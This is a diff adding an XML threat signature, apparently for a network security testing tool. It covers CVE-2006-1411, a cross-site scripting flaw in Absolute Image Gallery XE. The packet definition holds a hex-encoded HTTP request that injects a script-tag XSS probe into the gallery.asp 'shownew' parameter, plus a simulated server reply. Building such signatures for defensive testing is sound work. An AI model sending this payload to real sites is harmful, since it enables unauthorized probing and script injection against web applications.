@@ -1,0 +1,91 @@
+<?xml version="1.0" encoding="utf-8"?>
+<threatSignature>
+  <ThreatProperties>
+    <ExecDesc display="true" value="Absolute Image Gallery XE Multiple Cross-Site Scripting Vulnerability"/>
+    <EngDesc display="true" value="This threat sends a crafted url to take advantage of a flaw in Absolute Image Gallery XE which does not properly&#13;&#10;sanitize user-supplied which allows malicious users to execute code on the affected site.&#13;&#10;Absolute Image Gallery XE is a web application the typically listens on port 80"/>
+    <Intent display="true">
+      <item value="Unauthorized_Access"/>
+      <item value="Unauthorized_Use"/>
+      <item value="Command_Injection"/>
+    </Intent>
+    <Protocol display="true" value="HTTP"/>
+    <Type_Of_Equipment display="true">
+      <item value="Application"/>
+    </Type_Of_Equipment>
+    <Known_Vendors_Affected display="true">
+      <item value="XIGLA_SOFTWARE"/>
+    </Known_Vendors_Affected>
+    <Known_Products_Affected display="true">
+      <item value="XIGLA_SOFTWARE"/>
+      <item value="Absolute_Image_Gallery_XE"/>
+    </Known_Products_Affected>
+    <Known_Versions_Affected display="true">
+      <item value="XIGLA_SOFTWARE"/>
+      <item value="Absolute_Image_Gallery_XE"/>
+      <item value="Absolute_Image_Gallery_XE_2.0"/>
+    </Known_Versions_Affected>
+    <Credit display="true" value="http://pridels.blogspot.com/2006/03/absolute-image-gallery-xe-20-xss-vuln.html"/>
+    <CVEID display="true" value="CVE-2006-1411"/>
+    <bugtraqID display="true" value="18712"/>
+    <OSVDB display="true" value="24214"/>
+    <Author display="true" value="Mike Davis"/>
+    <ID value="a99e837836e0ce3561861ff0732c9582" display="true"/>
+    <Revision value="1" display="true"/>
+    <Safe display="true" value="true"/>
+    <ServerSideAttack display="true" value="false"/>
+    <SoftwareRevision display="true" value="1.4"/>
+    <Suite display="true" value="Standard"/>
+    <RunOnce display="false" value="false"/>
+    <Valid_Traffic display="false" value="true"/>
+    <AccessVector display="false" value="remote"/>
+    <AccessComplexity display="false" value="low"/>
+    <Authentication display="false" value="not-required"/>
+    <ConfImpact display="false" value="partial"/>
+    <IntegImpact display="false" value="partial"/>
+    <AvailImpact display="false" value="none"/>
+    <ImpactBias display="false" value="normal"/>
+    <FirstAdded display="false" value=""/>
+    <LastModified display="false" value="632871412590496487"/>
+    <SigStyle display="false" value=""/>
+    <targetNode display="false" value=""/>
+    <SigProtocol display="false" value=""/>
+    <Rate display="false" value=""/>
+    <Regex display="false" value=""/>
+    <Created value="1152906326" display="true"/>
+  </ThreatProperties>
+  <Variables>
+    <NamedVar name="destIP" type="ImperfectControls.IPv4Address" value="null" index="B"/>
+    <NamedVar name="sourceMAC" type="ImperfectControls.MacAddress" value="null" index="C"/>
+    <NamedVar name="destMAC" type="ImperfectControls.MacAddress" value="null" index="D"/>
+    <NamedVar name="HTTPdestPort" type="ImperfectControls.Port" value="null" index="E"/>
+    <NamedVar name="sourceIP" type="ImperfectControls.IPv4Address" value="null" index="F"/>
+  </Variables>
+  <Loops>
+    <for index="A">
+      <for index="C"/>
+      <for index="D"/>
+      <for index="F"/>
+      <for index="B"/>
+      <for index="E"/>
+    </for>
+  </Loops>
+  <Output index="A" Count="">
+    <Ethernet srcMac="$sourceMAC" destMac="$destMAC" pktType="0800">
+      <IP Version="04" InternetHeaderLength="" TypeofService="" TotalLength="" Identification="" FragmentOffset="" TTL="" Protocol="06" HeaderChecksum="" srcIP="$sourceIP" destIP="$destIP" options="" CE="" DF="" MF="">
+        <TCP srcPort="@random(1026,65535)" destPort="$HTTPdestPort" SeqNumber="" AckNumber="" HeaderLength="" WindowSize="" Checksum="" UrgentPointer="" Options="" Payload="474554202F67616C6C6572792E6173703F616374696F6E3D76696577696D6167652663617465676F727969643D3826746578743D26696D61676569643D343326626F783D2673686F776E65773D273E3C7363726970743E282758535327293C2F7363726970743E20485454502F312E300D0A486F73743A207777772E6578616D706C652E636F6D0D0A557365722D4167656E743A204D736E626F742F322E340D0A436F6E6E656374696F6E3A20436C6F73650D0A0D0A" CWR="" ECE="" URG="" ACK="" PSH="" RST="" SYN="" FIN="" RES1="" RES2="" RES3="" RES4=""/>
+      </IP>
+    </Ethernet>
+  </Output>
+  <Input>
+    <Ethernet/>
+  </Input>
+  <ServerSide display="1">
+    <Output index="B" Count="">
+      <Ethernet srcMac="" destMac="" pktType="">
+        <IP Version="4" InternetHeaderLength="" TypeofService="" TotalLength="" Identification="" FragmentOffset="" TTL="" Protocol="06" HeaderChecksum="" srcIP="" destIP="" options="" CE="" DF="" MF="">
+          <TCP srcPort="" destPort="" SeqNumber="" AckNumber="" HeaderLength="" WindowSize="" Checksum="" UrgentPointer="" Options="" Payload="485454502f312e3120323030204f4b0d0a5365727665723a204170616368650d0a4c6173742d4d6f6469666965643a204d6f6e2c2030322046656220323030342031313a33323a343120474d540d0a455461673a202261396436652d3830302d33643235636631383534383430220d0a4163636570742d52616e6765733a2062797465730d0a436f6e74656e742d4c656e6774683a20350d0a4b6565702d416c6976653a2074696d656f75743d31352c206d61783d3130300d0a436f6e6e656374696f6e3a204b6565702d416c6976650d0a436f6e74656e742d547970653a20746578742f706c61696e0d0a0d0a50776e5421" CWR="" ECE="" URG="" ACK="" PSH="" RST="" SYN="" FIN="" RES1="" RES2="" RES3="" RES4=""/>
+        </IP>
+      </Ethernet>
+    </Output>
+  </ServerSide>
+</threatSignature>
